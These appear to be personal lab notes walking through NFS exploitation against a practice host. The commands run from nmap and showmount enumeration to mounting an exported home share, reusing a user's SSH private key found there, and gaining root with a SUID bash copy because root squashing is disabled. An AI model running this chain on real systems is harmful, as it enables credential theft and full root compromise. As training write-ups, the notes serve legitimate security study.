
Pasted image 20240919160551


NFS stands for "Network File System" and allows a system to share directories and files with others over a network. By using NFS, users and programs can access files on remote systems almost as if they were local files. It does this by mounting all, or a portion of a file system on a server. The portion of the file system that is mounted can be accessed by clients with whatever privileges are assigned to each file.

If someone wants to access a file using NFS, an RPC call is placed to NFSD (the NFS daemon) on the server. This call takes parameters such as:

The file handle
 The name of the file to be accessed
 The user's, user ID
 The user's group ID

These are used in determining access rights to the specified file. This is what controls user permissions, read and write of files.

###  Enumerating NFS:

nmap  -A 10.10.191.163 -T5 -p- -nnvvvv

![[Attachments/Pasted image 20240920095232.png]]
### Using Nmap NSE nfs scripts:

![[Attachments/Pasted image 20240919163929.png]]


 nmap --script nfs-* 10.10.191.163  -T4  -nnvvvv

![[Attachments/Pasted image 20240920095032.png]]

#### Using showmount to list the shares on the remote host:

showmount queries the mount daemon on a remote host for information about the state of the NFS server on that machine. With no options showmount lists the set of clients who are mounting from that host

/usr/sbin/showmount -e 10.10.191.163

![[Attachments/Pasted image 20240920095126.png]]


### Portmap traffic:


The portmap service maps RPC service and version numbers to transport-specific port numbers.

When an RPC service is started, it will tell portmap what port number it is listening to, and what RPC program numbers it is prepared to serve. When a client wishes to make an RPC call to a given program number, it will first contact portmap on the server machine to determine the port number where RPC packets should be sent.
![[Attachments/Pasted image 20240920100456.png]]
### Portmap process:

The server registers with portmap.
The client gets the server’s port from portmap.
The client calls the server.

Network communication: 

![[Attachments/Pasted image 20240920095904.png]]



![[Attachments/Pasted image 20240920100041.png]]

When a client needs to mount a file system from a server, the client must obtain a file handle from the server. The file handle must correspond to the file system. This process requires that several transactions occur between the client and the server. In this example, the client is attempting to mount /home/ from the server 10.10.191.163 . A snoop trace for this transaction follows.

![[Attachments/Pasted image 20240920100127.png]]


### Mounting the share to local machine:

Create a directory where the share will be mounted:

mkdir /tmp/mount


sudo mount -t nfs 10.10.191.163:home /tmp/mount/ -nolock
 
### Breaking this down: 


mount : Execute the mount command

-t nfs : Type of device to mount, then specifying that it's NFS

IP:share:  	The IP Address of the NFS server, and the name of the share we wish to mount

-nolock: pecifies not to use NLM locking

### Navigating to the mounted share:

cd /tmp/mount
ls -l

![[Attachments/Pasted image 20240920102239.png]]
cd cappucino
![[Attachments/Pasted image 20240920102820.png]]
cd .ssh
![[Attachments/Pasted image 20240920102756.png]]

Looking at the connect of the id_rsa key with "nano" command :


![[Attachments/Pasted image 20240920103035.png]]


looking at the content of the authorized_keys with the "cat" command:


![[Attachments/Pasted image 20240920103610.png]]
I copied the private key to my local system and changed the permissions with chmod 600 file_name


ls -lhr id_rsa 
![[Attachments/Pasted image 20240920103435.png]]

### Login into the server via SSH using the private key:


ssh -i id_rsa cappucino@10.10.191.163

![[Attachments/Pasted image 20240920104035.png]]

### Exploding NFS:


By default, on NFS shares- Root Squashing is enabled, and prevents anyone connecting to the NFS share from having root access to the NFS volume. Remote root users are assigned a user “nfsnobody” when connected, which has the least local privileges. Not what we want. However, if this is turned off, it can allow the creation of SUID bit files, allowing a remote user root access to the connected system. 

 Files with the SUID means that the file or files can be run with the permissions of the file(s) owner/group. In this case, as the super-user. We can leverage this to get a shell with these privileges!
### Downloading the bash shell from the NFS server to local system:


scp -i ~/id_rsa  cappucino@10.10.191.163:/bin/bash ~/Downloads/bash

changing the permissions owner to root:

chown root bash

![[Attachments/Pasted image 20240920105617.png]]

Copying the bash file to /tmp/mount directory 

cp ~/Download/bash /tmp/mount

### Changing the permissions to SUID bit  using chmod:

chmod +s bash 


![[Attachments/Pasted image 20240920113954.png]]

## Summary:


NFS Access 
Gain Low Privilege Shell 
Upload Bash Executable to the NFS share
Set SUID Permissions Through NFS Due To Misconfigured Root Squash
Login through SSH
Execute SUID Bit Bash Executable
ROOT ACCESS
